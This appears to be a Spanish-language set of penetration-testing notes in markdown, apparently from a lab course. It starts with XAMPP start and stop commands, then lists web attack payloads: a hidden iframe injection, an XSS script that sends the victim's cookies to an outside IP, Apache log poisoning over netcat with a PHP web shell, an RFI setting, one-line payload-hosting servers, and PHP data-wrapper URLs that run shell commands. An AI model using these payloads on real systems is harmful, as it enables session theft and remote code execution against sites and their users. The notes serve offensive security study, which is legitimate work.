#### Iniciar y detener servicio mysql
```
c:\xampp\mysql_start.bat &
c:\xampp\mysql_stop.bat
```

#### Iniciar sesion en mysql
```
c:\xampp\mysql\bin\mysql.exe -u noroot -p
```

#### Iniciar y detener apache
```
c:\xampp\apache_start.bat
C:\xampp\apache_stop.bat
```

#### Iniciar y detener ambos servicios
```
C:\xampp\xampp_start.exe
C:\xampp\xampp_stop.exe
```

-----

### XSS
- XSS reflejado
- XSS persistente
- XSS basado en DOM

#### Content Injection
```
<iframe src=http://10.11.0.4/report height="0" width=”0”></iframe> 
```

#### Robo de cookies e información de sesión
```
<script>new Image().src="http://10.11.0.4/cool.jpg?output="+document.cookie;</script> 
```

----

### LFI
```
APACHE LOG
nc -nv 10.11.0.22 80
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

### RFI
```
allow_url_include=On
```

### Servidores HTTP
```
> python -m SimpleHTTPServer 8000
> python3 -m http.server 8000
> php -S 0.0.0.0:8000
> ruby -run -e httpd . -p 8000
> busybox httpd -f -p 8000
```

### PHP wrappers
```
http://10.11.0.22/menu.php?file=data:text/plain,hello world
http://10.11.0.22/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```

----

### SQLi
